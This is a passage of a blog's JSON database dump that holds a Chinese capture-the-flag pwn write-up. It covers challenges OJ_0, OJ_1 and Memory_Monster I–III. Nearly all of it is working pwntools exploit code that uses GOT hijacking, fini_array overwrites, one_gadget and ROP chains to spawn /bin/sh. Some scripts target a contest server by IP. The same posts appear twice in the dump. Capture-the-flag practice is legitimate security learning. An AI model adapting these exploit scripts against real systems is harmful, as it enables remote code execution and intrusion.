class=\"number\">1</span>, len(s)):</span><br><span class=\"line\">    result += <span class=\"string\">', main%d=%s'</span> % (i, hex(ord(s[i])))</span><br><span class=\"line\">result += <span class=\"string\">';'</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = result+<span class=\"string\">'@'</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Memory-Monster-I\"><a href=\"#Memory-Monster-I\" class=\"headerlink\" title=\"Memory_Monster_I\"></a>Memory_Monster_I</h3><p>劫持got表，触发canary。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">'183.129.189.60'</span>,<span class=\"number\">10081</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process('./Memory_Monster_I')</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">'./Memory_Monster_I'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">check_addr = <span class=\"number\">0x404028</span></span><br><span class=\"line\">pwn_addr = <span class=\"number\">0x040124a</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p,'b *0x401238')</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">'r:'</span>)</span><br><span class=\"line\">payload = p64(check_addr)+<span class=\"string\">'a'</span>*<span class=\"number\">0x25</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">'a:'</span>)</span><br><span class=\"line\">payload = p64(pwn_addr)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"Memory-Monster-II\"><a href=\"#Memory-Monster-II\" class=\"headerlink\" title=\"Memory_Monster_II\"></a>Memory_Monster_II</h3><p>改写_fini_array[1]为main，_fini_array[0]为__libc_csu_fini,实现多次写。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = remote('183.129.189.60',10104)</span></span><br><span class=\"line\">sh = process(<span class=\"string\">'./Memory_Monster_II'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fini_addr = <span class=\"number\">0x00000000004B80B0</span></span><br><span class=\"line\">libc_csu = <span class=\"number\">0x0000000000402CB0</span></span><br><span class=\"line\">main_addr = <span class=\"number\">0x0000000000401C1D</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x0000000000401CF3</span></span><br><span class=\"line\">bin_addr = <span class=\"number\">0x0000000000492895</span></span><br><span class=\"line\">esp = fini_addr + <span class=\"number\">0x10</span></span><br><span class=\"line\">ret = <span class=\"number\">0x0000000000401016</span></span><br><span class=\"line\">pop_rdx = <span class=\"number\">0x0000000000448415</span></span><br><span class=\"line\">pop_rax = <span class=\"number\">0x0000000000448fcc</span> </span><br><span class=\"line\">pop_rsi = <span class=\"number\">0x0000000000406f80</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000401746</span></span><br><span class=\"line\">syscall = <span class=\"number\">0x0000000000402514</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write</span><span class=\"params\">(addr,data)</span>:</span></span><br><span class=\"line\">    sh.recvuntil(<span class=\"string\">'addr:'</span>)</span><br><span class=\"line\">    sh.send(p64(addr))</span><br><span class=\"line\">    sh.recvuntil(<span class=\"string\">'data:'</span>)</span><br><span class=\"line\">    sh.send(data)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">write(fini_addr,p64(libc_csu)+p64(main_addr))</span><br><span class=\"line\">write(esp,p64(pop_rax))</span><br><span class=\"line\">write(esp+<span class=\"number\">8</span>,p64(<span class=\"number\">0x3b</span>))</span><br><span class=\"line\">write(esp+<span class=\"number\">16</span>,p64(pop_rdi))</span><br><span class=\"line\">write(esp+<span class=\"number\">24</span>,p64(bin_addr))</span><br><span class=\"line\">write(esp+<span class=\"number\">32</span>,p64(pop_rsi))</span><br><span class=\"line\">write(esp+<span class=\"number\">40</span>,p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">write(esp+<span class=\"number\">48</span>,p64(pop_rdx))</span><br><span class=\"line\">write(esp+<span class=\"number\">56</span>,p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">write(esp+<span class=\"number\">64</span>,p64(syscall))</span><br><span class=\"line\"></span><br><span class=\"line\">write(fini_addr,p64(leave_ret)+p64(ret))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"Memory-Monster-III\"><a href=\"#Memory-Monster-III\" class=\"headerlink\" title=\"Memory_Monster_III\"></a>Memory_Monster_III</h3><p>同Memory_Monster_II，找个地方写入’/bin/sh\\x00’</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = remote('183.129.189.60',10008)</span></span><br><span class=\"line\">sh = process(<span class=\"string\">'./Memory_Monster_III'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fini_addr = <span class=\"number\">0x00000000004B50B0</span></span><br><span class=\"line\">libc_csu = <span class=\"number\">0x0000000000402CA0</span></span><br><span class=\"line\">main_addr = <span class=\"number\">0x0000000000401C1D</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x0000000000401CF3</span></span><br><span class=\"line\">bin_addr = <span class=\"number\">0x00000000004bd790</span> </span><br><span class=\"line\">esp = fini_addr + <span class=\"number\">0x10</span></span><br><span class=\"line\">ret = <span class=\"number\">0x0000000000401016</span></span><br><span class=\"line\">pop_rdx = <span class=\"number\">0x0000000000447635</span></span><br><span class=\"line\">pop_rax = <span class=\"number\">0x000000000044806c</span></span><br><span class=\"line\">pop_rsi = <span class=\"number\">0x0000000000406f70</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000401746</span> </span><br><span class=\"line\">syscall = <span class=\"number\">0x0000000000402504</span> </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write</span><span class=\"params\">(addr,data)</span>:</span></span><br><span class=\"line\">    sh.recvuntil(<span class=\"string\">'addr:'</span>)</span><br><span class=\"line\">    sh.send(p64(addr))</span><br><span class=\"line\">    sh.recvuntil(<span class=\"string\">'data:'</span>)</span><br><span class=\"line\">    sh.send(data)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\"></span><br><span class=\"line\">write(fini_addr,p64(libc_csu)+p64(main_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">write(bin_addr,<span class=\"string\">'/bin/sh\\x00'</span>)</span><br><span class=\"line\">write(esp,p64(pop_rax))</span><br><span class=\"line\">write(esp+<span class=\"number\">8</span>,p64(<span class=\"number\">0x3b</span>))</span><br><span class=\"line\">write(esp+<span class=\"number\">16</span>,p64(pop_rdi))</span><br><span class=\"line\">write(esp+<span class=\"number\">24</span>,p64(bin_addr))</span><br><span class=\"line\">write(esp+<span class=\"number\">32</span>,p64(pop_rsi))</span><br><span class=\"line\">write(esp+<span class=\"number\">40</span>,p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">write(esp+<span class=\"number\">48</span>,p64(pop_rdx))</span><br><span class=\"line\">write(esp+<span class=\"number\">56</span>,p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">write(esp+<span class=\"number\">64</span>,p64(syscall))</span><br><span class=\"line\"></span><br><span class=\"line\">write(fini_addr,p64(leave_ret)+p64(ret))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"Oj-0\"><a href=\"#Oj-0\" class=\"headerlink\" title=\"Oj_0\"></a>Oj_0</h3><p>先用printf泄露栈结构，查libc版本，onegadget一把梭。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">'183.129.189.60'</span>,**)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">'@'</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = </span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    int main()</span></span><br><span class=\"line\"><span class=\"string\">    &#123;</span></span><br><span class=\"line\"><span class=\"string\">        long int a[1];</span></span><br><span class=\"line\"><span class=\"string\">        a[3]+=282918;  #one_gadget</span></span><br><span class=\"line\"><span class=\"string\">        return 0;</span></span><br><span class=\"line\"><span class=\"string\">    &#125; </span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"OJ-1\"><a href=\"#OJ-1\" class=\"headerlink\" title=\"OJ_1\"></a>OJ_1</h3><p>同样的，onegadget，用汇编写。<br>附上链接<br><a href=\"https://jlkl.github.io/2017/10/14/%E6%9C%89%E8%B6%A3%E7%9A%84%E2%80%9CHello%20World%E2%80%9D/\" target=\"_blank\" rel=\"noopener\">不用括号输出Hello,World</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\">context.arch=<span class=\"string\">'amd64'</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">'183.129.189.60'</span>,<span class=\"number\">10002</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">'@'</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">s = asm(<span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    push rbp</span></span><br><span class=\"line\"><span class=\"string\">    mov rbp,rsp</span></span><br><span class=\"line\"><span class=\"string\">    sub rsp,10</span></span><br><span class=\"line\"><span class=\"string\">    mov rax ,[rbp+8]</span></span><br><span class=\"line\"><span class=\"string\">    add rax, 0xd0917</span></span><br><span class=\"line\"><span class=\"string\">    mov [rbp+8],rax</span></span><br><span class=\"line\"><span class=\"string\">    leave</span></span><br><span class=\"line\"><span class=\"string\">    ret</span></span><br><span class=\"line\"><span class=\"string\">'''</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">result = <span class=\"string\">''</span></span><br><span class=\"line\">result += <span class=\"string\">'const char main=%s'</span> % hex(ord(s[<span class=\"number\">0</span>]))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(s)):</span><br><span class=\"line\">    result += <span class=\"string\">', main%d=%s'</span> % (i, hex(ord(s[i])))</span><br><span class=\"line\">result += <span class=\"string\">';'</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = result+<span class=\"string\">'@'</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Memory-Monster-I\"><a href=\"#Memory-Monster-I\" class=\"headerlink\" title=\"Memory_Monster_I\"></a>Memory_Monster_I</h3><p>劫持got表，触发canary。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">'183.129.189.60'</span>,<span class=\"number\">10081</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process('./Memory_Monster_I')</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">'./Memory_Monster_I'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">check_addr = <span class=\"number\">0x404028</span></span><br><span class=\"line\">pwn_addr = <span class=\"number\">0x040124a</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p,'b *0x401238')</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">'r:'</span>)</span><br><span class=\"line\">payload = p64(check_addr)+<span class=\"string\">'a'</span>*<span class=\"number\">0x25</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">'a:'</span>)</span><br><span class=\"line\">payload = p64(pwn_addr)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"Memory-Monster-II\"><a href=\"#Memory-Monster-II\" class=\"headerlink\" title=\"Memory_Monster_II\"></a>Memory_Monster_II</h3><p>改写_fini_array[1]为main，_fini_array[0]为__libc_csu_fini,实现多次写。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = remote('183.129.189.60',10104)</span></span><br><span class=\"line\">sh = process(<span class=\"string\">'./Memory_Monster_II'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fini_addr = <span class=\"number\">0x00000000004B80B0</span></span><br><span class=\"line\">libc_csu = <span class=\"number\">0x0000000000402CB0</span></span><br><span class=\"line\">main_addr = <span class=\"number\">0x0000000000401C1D</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x0000000000401CF3</span></span><br><span class=\"line\">bin_addr = <span class=\"number\">0x0000000000492895</span></span><br><span class=\"line\">esp = fini_addr + <span class=\"number\">0x10</span></span><br><span class=\"line\">ret = <span class=\"number\">0x0000000000401016</span></span><br><span class=\"line\">pop_rdx = <span class=\"number\">0x0000000000448415</span></span><br><span class=\"line\">pop_rax = <span class=\"number\">0x0000000000448fcc</span> </span><br><span class=\"line\">pop_rsi = <span class=\"number\">0x0000000000406f80</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000401746</span></span><br><span class=\"line\">syscall = <span class=\"number\">0x0000000000402514</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write</span><span class=\"params\">(addr,data)</span>:</span></span><br><span class=\"line\">    sh.recvuntil(<span class=\"string\">'addr:'</span>)</span><br><span class=\"line\">    sh.send(p64(addr))</span><br><span class=\"line\">    sh.recvuntil(<span class=\"string\">'data:'</span>)</span><br><span class=\"line\">    sh.send(data)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">write(fini_addr,p64(libc_csu)+p64(main_addr))</span><br><span class=\"line\">write(esp,p64(pop_rax))</span><br><span class=\"line\">write(esp+<span class=\"number\">8</span>,p64(<span class=\"number\">0x3b</span>))</span><br><span class=\"line\">write(esp+<span class=\"number\">16</span>,p64(pop_rdi))</span><br><span class=\"line\">write(esp+<span class=\"number\">24</span>,p64(bin_addr))</span><br><span class=\"line\">write(esp+<span class=\"number\">32</span>,p64(pop_rsi))</span><br><span class=\"line\">write(esp+<span class=\"number\">40</span>,p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">write(esp+<span class=\"number\">48</span>,p64(pop_rdx))</span><br><span class=\"line\">write(esp+<span class=\"number\">56</span>,p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">write(esp+<span class=\"number\">64</span>,p64(syscall))</span><br><span class=\"line\"></span><br><span class=\"line\">write(fini_addr,p64(leave_ret)+p64(ret))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"Memory-Monster-III\"><a href=\"#Memory-Monster-III\" class=\"headerlink\" title=\"Memory_Monster_III\"></a>Memory_Monster_III</h3><p>同Memory_Monster_II，找个地方写入’/bin/sh\\x00’</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = remote('183.129.189.60',10008)</span></span><br><span class=\"line\">sh = process(<span class=\"string\">'./Memory_Monster_III'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fini_addr = <span class=\"number\">0x00000000004B50B0</span></span><br><span class=\"line\">libc_csu = <span class=\"number\">0x0000000000402CA0</span></span><br><span class=\"line\">main_addr = <span class=\"number\">0x0000000000401C1D</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x0000000000401CF3</span></span><br><span class=\"line\">bin_addr = <span class=\"number\">0x00000000004bd790</span> </span><br><span class=\"line\">esp = fini_addr + <span class=\"number\">0x10</span></span><br><span class=\"line\">ret = <span class=\"number\">0x0000000000401016</span></span><br><span class=\"line\">pop_rdx = <span class=\"number\">0x0000000000447635</span></span><br><span class=\"line\">pop_rax = <span class=\"number\">0x000000000044806c</span></span><br><span class=\"line\">pop_rsi = <span class=\"number\">0x0000000000406f70</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000401746</span> </span><br><span class=\"line\">syscall = <span class=\"number\">0x0000000000402504</span> </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write</span><span class=\"params\">(addr,data)</span>:</span></span><br><span class=\"line\">    sh.recvuntil(<span class=\"string\">'addr:'</span>)</span><br><span class=\"line\">    sh.send(p64(addr))</span><br><span class=\"line\">    sh.recvuntil(<span class=\"string\">'data:'</span>)</span><br><span class=\"line\">    sh.send(data)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\"></span><br><span class=\"line\">write(fini_addr,p64(libc_csu)+p64(main_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">write(bin_addr,<span class=\"string\">'/bin/sh\\x00'</span>)</span><br><span class=\"line\">write(esp,p64(pop_rax))</span><br><span class=\"line\">write(esp+<span class=\"number\">8</span>,p64(<span class=\"number\">0x3b</span>))</span><br><span class=\"line\">write(esp+<span class=\"number\">16</span>,p64(pop_rdi))</span><br><span class=\"line\">write(esp+<span class=\"number\">24</span>,p64(bin_addr))</span><br><span class=\"line\">write(esp+<span class=\"number\">32</span>,p64(pop_rsi))</span><br><span class=\"line\">write(esp+<span class=\"number\">40</span>,p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">write(esp+<span class=\"number\">48</span>,p64(pop_rdx))</span><br><span class=\"line\">write(esp+<span class=\"number\">56</span>,p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">write(esp+<span class=\"number\">64</span>,p64(syscall))</span><br><span class=\"line\"></span><br><span class=\"line\">write(fini_addr,p64(leave_ret)+p64(ret))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"ckc74vbl300074djx5xrt1s4z","category_id":"ckc74vbkv00044djxbiyi9dt2","_id":"ckc74vblg000d4djx8f9hh6zh"},{"post_id":"ckc74vbk000004djx5j2p3jc6","category_id":"ckc74vbkv00044djxbiyi9dt2","_id":"ckc74vbli000h4djx2o8n2b2d"},{"post_id":"ckc74vbl500084djxbts8c55i","category_id":"ckc74vbkv00044djxbiyi9dt2","_id":"ckc74vblj000j4djxcifibenx"},{"post_id":"ckc74vbkl00024djx9pq13lpi","category_id":"ckc74vbkv00044djxbiyi9dt2","_id":"ckc74vblj000k4djx7hj627wi"},{"post_id":"ckc74vbl100064djx5l0l0h0v","category_id":"ckc74vblh000e4djx6uil5yy2","_id":"ckc74vblk000m4djxci03979g"}],"PostTag":[{"post_id":"ckc74vbl300074djx5xrt1s4z","tag_id":"ckc74vbl000054djx11b2dsqw","_id":"ckc74vble000b4djxcrzld61q"},{"post_id":"ckc74vbk000004djx5j2p3jc6","tag_id":"ckc74vbl000054djx11b2dsqw","_id":"ckc74vblg000c4djxcj8l5mw0"},{"post_id":"ckc74vbl500084djxbts8c55i","tag_id":"ckc74vbl000054djx11b2dsqw","_id":"ckc74vbli000g4djx0jd13d66"},{"post_id":"ckc74vbkl00024djx9pq13lpi","tag_id":"ckc74vbl000054djx11b2dsqw","_id":"ckc74vblj000i4djxckr695rg"},{"post_id":"ckc74vbl100064djx5l0l0h0v","tag_id":"ckc74vblh000f4djx9mkzbzh1","_id":"ckc74vblk000l4djx8vpvai14"}],"Tag":[{"name":"pwn","_id":"ckc74vbl000054djx11b2dsqw"},{"name":"life","_id":"ckc74vblh000f4djx9mkzbzh1"}]}}